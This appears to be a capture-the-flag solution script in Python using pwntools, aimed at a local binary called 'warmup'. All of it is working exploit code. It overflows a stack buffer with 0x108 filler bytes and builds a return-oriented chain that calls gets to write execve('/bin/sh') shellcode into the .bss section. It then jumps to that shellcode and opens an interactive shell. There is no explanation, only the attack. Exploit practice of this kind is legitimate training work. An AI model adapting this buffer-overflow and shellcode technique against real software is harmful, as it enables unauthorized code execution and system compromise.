from pwn import *

e = ELF('./warmup-b8fa17414a043a62ba16fdeb4f82051d35fc6f434f7130d6d988d6c2d312e73e')
p = process('./warmup-b8fa17414a043a62ba16fdeb4f82051d35fc6f434f7130d6d988d6c2d312e73e')

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

ret_addr = 0x0040053e
pop_rdi_addr = 0x00400773
gets_addr = e.plt['gets'] #0x400580
bss_addr = e.bss() + 0x100 #0x00601060

payload = 'A'*0x108
#payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(bss_addr)
payload += p64(gets_addr)
payload += p64(bss_addr)
#payload += shellcode
#print p.recvuntil('Please pwn me :)')
#print shellcode
print p.recvuntil(':)\n')
p.sendline(payload)
p.sendline(shellcode)
p.interactive()
print p.recv()